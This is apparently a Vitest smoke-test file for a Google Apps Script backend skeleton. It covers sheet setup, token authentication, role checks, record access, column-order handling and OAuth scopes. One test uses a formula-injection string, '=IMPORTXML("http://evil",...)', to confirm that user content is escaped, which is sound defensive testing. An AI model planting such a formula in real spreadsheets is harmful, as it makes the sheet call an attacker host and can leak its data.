import { describe, it, expect } from 'vitest';
import { loadGas } from './helpers/loadGas.js';
import { createFakeGoogle } from './helpers/fakeGoogle.js';

/**
 * 冒煙測試 —— 骨架搭好後第一個該跑的測試。
 *
 * 用法：把 assets/gas-core 複製到 gas/、assets/test-harness 複製到 tests/helpers/，
 * 這個檔案放 tests/，然後 `npx vitest run`。全過代表整條路徑是通的：
 * 建表、自我檢查、身分驗證、RBAC、資料讀寫、公式跳脫、欄位順序容錯。
 *
 * 之後把 EMAILS / 角色 / 工作表名稱換成你的，這個檔案就變成你的測試起點。
 *
 * 這份測試不是裝飾 —— 撰寫這個 skill 時用它驗證骨架，當場抓到兩個
 * 「同一份資訊寫在兩個地方」的 bug（角色清單與工作表清單），
 * 那兩個 bug 在原專案的 165 個測試裡都沒被發現。
 */

const NOW = Date.UTC(2026, 8, 2, 11, 5, 0);   // 2026-09-02 19:05 台北

const EMAILS = {
  admin: 'admin@example.com',
  editor: 'editor@example.com',
  viewer: 'viewer@example.com',
  disabled: 'disabled@example.com',
  outsider: 'outsider@example.com'
};
const TOKENS = Object.fromEntries(Object.entries(EMAILS).map(([k, v]) => [k, 'tok-' + k]));
const TOKEN_MAP = Object.fromEntries(Object.entries(TOKENS).map(([k, v]) => [v, EMAILS[k]]));

function frozenDate(fixedMs) {
  const RealDate = Date;
  function FrozenDate(...args) {
    return args.length === 0 ? new RealDate(fixedMs) : new RealDate(...args);
  }
  FrozenDate.now = () => fixedMs;
  FrozenDate.UTC = RealDate.UTC;
  FrozenDate.parse = RealDate.parse;
  FrozenDate.prototype = RealDate.prototype;
  return FrozenDate;
}

function createEnv({ empty = false } = {}) {
  const sheets = empty ? {} : {
    __RBAC_Roles: [
      ['email', 'name', 'role', 'status'],
      [EMAILS.admin, '管理者', 'ADMIN', 'ACTIVE'],
      [EMAILS.editor, '編輯者', 'EDITOR', 'ACTIVE'],
      [EMAILS.viewer, '檢視者', 'VIEWER', 'ACTIVE'],
      [EMAILS.disabled, '已停用', 'VIEWER', 'DISABLED']
    ],
    Records: [['id', 'owner_email', 'content', 'created_at', 'status']]
  };

  const fake = createFakeGoogle({ sheets, tokens: { ...TOKEN_MAP } });
  fake.services.DriveApp.getFileById = (id) =>
    id === 'fake-spreadsheet-id'
      ? { getOwner: () => ({ getEmail: () => EMAILS.admin }) }
      : fake.driveStore.files.get(id);

  const gas = loadGas({ ...fake.services, Date: frozenDate(NOW) });

  const call = (action, idToken, data = {}) =>
    JSON.parse(gas.doPost({
      postData: { contents: JSON.stringify({ idToken, action, data }) }
    }).getContent());

  const ok = (action, idToken, data = {}) => {
    const res = call(action, idToken, data);
    if (!res.success) throw new Error(`${action} 失敗：${res.error.code} ${res.error.message}`);
    return res.data;
  };

  return { gas, fake, call, ok };
}

describe('骨架開箱即可用', () => {
  it('setupSpreadsheet 從空試算表建出所有工作表', () => {
    const { gas, fake } = createEnv({ empty: true });
    const report = gas.setupSpreadsheet();

    expect(fake.spreadsheet.getSheetByName('__RBAC_Roles')).toBeTruthy();
    expect(fake.spreadsheet.getSheetByName('Records')).toBeTruthy();
    // 擁有者被自動寫入名冊，否則部署完沒人能登入
    expect(fake.rowsOf('__RBAC_Roles')).toEqual([
      { email: EMAILS.admin, name: '管理者', role: 'ADMIN', status: 'ACTIVE' }
    ]);
    expect(report).toContain('__RBAC_Roles');
  });

  it('setupSpreadsheet 可重複執行而不破壞既有資料', () => {
    const { gas, fake } = createEnv({ empty: true });
    gas.setupSpreadsheet();
    const report = gas.setupSpreadsheet();
    expect(report).toContain('已存在且欄位完整');
    expect(fake.rowsOf('__RBAC_Roles')).toHaveLength(1);
  });

  it('verifySetup 在設定完整時全部通過', () => {
    const { gas } = createEnv({ empty: true });
    gas.setupSpreadsheet();
    const report = gas.verifySetup();
    expect(report).toContain('=== 全部通過 ===');
    expect(report).not.toContain('[失敗]');
  });

  it('doGet 健康檢查可用（部署後第一個該測的東西）', () => {
    const { gas } = createEnv();
    const res = JSON.parse(gas.doGet().getContent());
    expect(res.data.status).toBe('ok');
    expect(res.data.serverTime).toBe('2026-09-02T19:05:00+08:00');
  });
});

describe('身分驗證與授權', () => {
  it('無效 token 被拒絕', () => {
    expect(createEnv().call('getProfile', 'bogus').error.code).toBe('UNAUTHENTICATED');
  });

  it('不在名冊者被拒絕，且訊息寫出實際的 email', () => {
    const res = createEnv().call('getProfile', TOKENS.outsider);
    expect(res.error.code).toBe('NOT_ENROLLED');
    expect(res.error.message).toContain(EMAILS.outsider);
  });

  it('停用帳號被拒絕', () => {
    expect(createEnv().call('getProfile', TOKENS.disabled).error.code).toBe('ACCOUNT_DISABLED');
  });

  it('角色白名單生效', () => {
    const env = createEnv();
    expect(env.ok('getProfile', TOKENS.viewer).role).toBe('VIEWER');
    expect(env.call('createRecord', TOKENS.viewer, { content: 'x' }).error.code).toBe('FORBIDDEN');
    expect(env.call('refreshCache', TOKENS.editor).error.code).toBe('FORBIDDEN');
    expect(env.ok('createRecord', TOKENS.editor, { content: 'x' }).id).toBeTruthy();
  });

  it('剛加入名冊的人不必等快取過期', () => {
    const env = createEnv();
    env.ok('getProfile', TOKENS.admin);            // 先讓名冊進快取
    env.fake.sheetObjects['__RBAC_Roles'].appendRow(['new@example.com', '新人', 'EDITOR', 'ACTIVE']);
    env.fake.tokens['tok-new'] = 'new@example.com';
    expect(env.ok('getProfile', 'tok-new').role).toBe('EDITOR');
  });
});

describe('資料讀寫', () => {
  it('建立後讀得回來，且非管理者只看得到自己的', () => {
    const env = createEnv();
    env.ok('createRecord', TOKENS.editor, { content: '編輯者的資料' });
    env.ok('createRecord', TOKENS.admin, { content: '管理者的資料' });

    expect(env.ok('listRecords', TOKENS.admin).records).toHaveLength(2);
    const mine = env.ok('listRecords', TOKENS.editor).records;
    expect(mine).toHaveLength(1);
    expect(mine[0].content).toBe('編輯者的資料');
  });

  it('非管理者的回應不含任何他人 email', () => {
    const env = createEnv();
    env.ok('createRecord', TOKENS.admin, { content: 'x' });
    env.ok('createRecord', TOKENS.editor, { content: 'y' });
    const data = env.ok('listRecords', TOKENS.editor);
    expect(JSON.stringify(data)).not.toContain(EMAILS.admin);
  });

  it('以公式開頭的內容會被跳脫，讀回來仍是原文', () => {
    const env = createEnv();
    const dangerous = '=IMPORTXML("http://evil","//x")';
    env.ok('createRecord', TOKENS.editor, { content: dangerous });

    const raw = env.fake.sheetObjects['Records'].data[1];
    expect(raw.some((c) => String(c).startsWith("'="))).toBe(true);
    expect(env.ok('listRecords', TOKENS.editor).records[0].content).toBe(dangerous);
  });

  it('拒絕空內容', () => {
    expect(createEnv().call('createRecord', TOKENS.editor, { content: '   ' }).error.code)
      .toBe('VALIDATION_ERROR');
  });

  it('欄位順序調換後仍能正確讀寫', () => {
    const env = createEnv();
    env.fake.sheetObjects['Records'].data[0] = ['status', 'content', 'id', 'created_at', 'owner_email'];
    env.ok('createRecord', TOKENS.editor, { content: '順序無關' });
    expect(env.ok('listRecords', TOKENS.editor).records[0].content).toBe('順序無關');
  });

  it('缺少欄位時以明確的 SCHEMA_ERROR 失敗', () => {
    const env = createEnv();
    env.fake.sheetObjects['Records'].data[0] = ['id', 'content'];
    const res = env.call('listRecords', TOKENS.admin);
    expect(res.error.code).toBe('SCHEMA_ERROR');
    expect(res.error.message).toContain('owner_email');
  });
});

describe('權限宣告與程式實際用到的 API 一致', () => {
  it('oauthScopes 涵蓋每一項需要的權限', async () => {
    const { readFileSync } = await import('node:fs');
    const manifest = JSON.parse(
      readFileSync(new URL('../gas/appsscript.json', import.meta.url), 'utf8')
    );
    expect(manifest.timeZone).toBe('Asia/Taipei');
    for (const scope of [
      'https://www.googleapis.com/auth/spreadsheets',
      'https://www.googleapis.com/auth/drive',
      'https://www.googleapis.com/auth/script.external_request',
      'https://www.googleapis.com/auth/script.scriptapp',
      'https://www.googleapis.com/auth/userinfo.email'
    ]) {
      expect(manifest.oauthScopes).toContain(scope);
    }
    expect(manifest.webapp).toEqual({ executeAs: 'USER_DEPLOYING', access: 'ANYONE' });
  });
});
